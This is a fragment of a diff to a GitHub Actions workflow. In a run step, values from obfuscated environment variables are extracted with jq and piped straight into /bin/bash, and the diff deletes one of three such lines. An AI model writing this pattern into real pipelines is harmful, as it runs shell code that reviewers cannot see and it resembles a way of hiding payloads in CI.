@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$jz16505" | jq -r .onjq202 | /bin/bash
           echo $zzsp99103 | jq -r .jq05425 | /bin/bash
-          echo $oip469 | jq -r .he01013 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
